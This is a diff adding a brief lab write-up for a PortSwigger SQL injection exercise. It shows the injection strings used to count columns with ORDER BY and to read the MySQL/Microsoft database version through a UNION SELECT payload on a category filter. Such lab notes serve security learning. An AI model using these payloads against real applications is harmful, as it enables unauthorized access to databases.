@@ -1,0 +1,14 @@
+SQL Injection attack, query the database type and version on MySQL and Microsoft
+https://ranakhalil.teachable.com/courses/1491236/lectures/34259867
+https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft
+
+Goal: Use the vulnerability in the product category filter to retrieve the database version.
+
+Analysis:
+---------
+1. Get Number of Columns - '+Order+By+(n)#  | n = number of columns. - When error number of columns  = n-1 (When using # as comment you can't send it in browser url use Burp Suite Repeater)
+    Number of columns for this lab is 2  
+    - Solution = /filter?category=Corporate+gifts'+order+by+3%23 (Gives an error so 3-1 = 2)
+
+2. Get Database version
+    -Solution: '+UNION+SELECT+NULL,%40%40version%23 
